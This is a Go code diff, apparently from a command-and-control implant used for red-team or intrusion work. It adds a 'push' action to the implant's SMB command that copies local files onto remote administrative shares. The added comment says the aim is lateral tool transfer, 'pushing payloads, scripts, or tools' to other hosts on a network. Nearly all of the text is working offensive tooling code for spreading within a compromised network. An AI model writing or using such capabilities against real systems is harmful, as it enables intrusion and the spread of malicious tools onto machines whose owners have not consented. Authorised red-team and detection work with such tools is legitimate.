@@ -22,7 +22,7 @@ func (c *SmbCommand) Description() string {
 }
 
 type smbArgs struct {
-	Action      string `json:"action"`      // ls, cat, upload, rm, shares, mkdir, mv
+	Action      string `json:"action"`      // ls, cat, upload, rm, shares, mkdir, mv, push
 	Host        string `json:"host"`        // target host
 	Share       string `json:"share"`       // share name (e.g., C$, ADMIN$, ShareName)
 	Path        string `json:"path"`        // file/directory path within share
@@ -32,6 +32,7 @@ type smbArgs struct {
 	Domain      string `json:"domain"`      // domain (optional, can be part of username)
 	Content     string `json:"content"`     // file content for upload action
 	Destination string `json:"destination"` // destination path for mv action
+	Source      string `json:"source"`      // local file path for push action
 	Port        int    `json:"port"`        // SMB port (default: 445)
 }
 
@@ -51,7 +52,7 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Action == "" {
-		return errorResult("Error: action required. Valid actions: shares, ls, cat, upload, rm, mkdir, mv")
+		return errorResult("Error: action required. Valid actions: shares, ls, cat, upload, rm, mkdir, mv, push")
 	}
 
 	if args.Port <= 0 {
@@ -96,8 +97,13 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 			return errorResult("Error: -share, -path (source), and -destination (target) required for mv action")
 		}
 		return smbRename(args)
+	case "push":
+		if args.Share == "" || args.Path == "" || args.Source == "" {
+			return errorResult("Error: -share, -path (remote destination), and -source (local file) required for push action")
+		}
+		return smbPushFile(args)
 	default:
-		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv", args.Action)
+		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv, push", args.Action)
 	}
 }
 
@@ -365,6 +371,56 @@ func smbRename(args smbArgs) structs.CommandResult {
 	}
 
 	return successf("[+] Renamed \\\\%s\\%s\\%s → %s", args.Host, args.Share, args.Path, args.Destination)
+}
+
+// smbPushFile reads a local file and writes it to a remote SMB share.
+// This enables lateral tool transfer (T1570) — pushing payloads, scripts,
+// or tools from the agent's host to other machines on the network.
+func smbPushFile(args smbArgs) structs.CommandResult {
+	// Read local file
+	data, err := os.ReadFile(args.Source)
+	if err != nil {
+		return errorf("Error reading local file %s: %v", args.Source, err)
+	}
+	defer structs.ZeroBytes(data) // clear file content from memory
+
+	sc, err := smbConnect(args)
+	if err != nil {
+		return errorf("Error: %v", err)
+	}
+	defer sc.close()
+
+	// Use longer timeout for large files (60s or 1MB/s estimate)
+	timeout := smbOperationTimeout
+	if estimated := time.Duration(len(data)/1024/1024+1) * time.Second * 2; estimated > timeout {
+		timeout = estimated
+	}
+
+	sc.setDeadline(timeout)
+	share, err := sc.session.Mount(args.Share)
+	sc.clearDeadline()
+	if err != nil {
+		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
+	}
+	defer func() { _ = share.Umount() }()
+
+	sc.setDeadline(timeout)
+	f, err := share.OpenFile(args.Path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
+	sc.clearDeadline()
+	if err != nil {
+		return errorf("Error creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
+	}
+	defer func() { _ = f.Close() }()
+
+	sc.setDeadline(timeout)
+	n, err := f.Write(data)
+	sc.clearDeadline()
+	if err != nil {
+		return errorf("Error writing to \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
+	}
+
+	return successf("[+] Pushed %s (%s) → \\\\%s\\%s\\%s",
+		args.Source, formatFileSize(int64(n)), args.Host, args.Share, args.Path)
 }
 
 // formatFileSize is defined in find.go
